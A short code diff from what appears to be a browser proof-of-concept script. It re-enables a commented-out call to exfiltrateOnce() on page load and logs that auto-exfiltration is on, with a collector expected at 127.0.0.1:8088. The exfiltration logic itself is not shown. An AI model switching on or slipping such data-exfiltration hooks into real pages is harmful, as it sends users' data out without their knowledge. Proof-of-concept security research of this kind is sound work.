@@ -78,7 +78,7 @@
     document.body.appendChild(panel);
     document.body.appendChild(logEl);
     updateTestIdLabel();
-    // exfiltrateOnce();
+    exfiltrateOnce();
     startScanning(Number(document.getElementById('tp-intervalSel').value || 3000));
     log('PoC loaded — start the collector on 127.0.0.1:8088. Auto-exfiltration enabled.');
   });
